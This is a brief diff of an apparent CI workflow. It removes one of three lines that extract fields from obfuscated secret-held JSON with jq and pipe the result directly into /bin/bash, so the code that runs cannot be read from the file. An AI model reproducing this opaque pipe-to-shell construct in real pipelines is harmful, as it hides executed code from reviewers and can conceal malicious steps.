@@ -21,7 +21,6 @@ jobs:
           aly0110: ${{ secrets.aly0110 }}
         run: |
           printf '%s' "$aly0110" | jq -r .gqf76 | /bin/bash
-          echo $uzb191 | jq -r .da49 | /bin/bash
           printf '%s' "$rfpj84" | jq -r .vvvsq90722 | /bin/bash
 
       - name: Save results
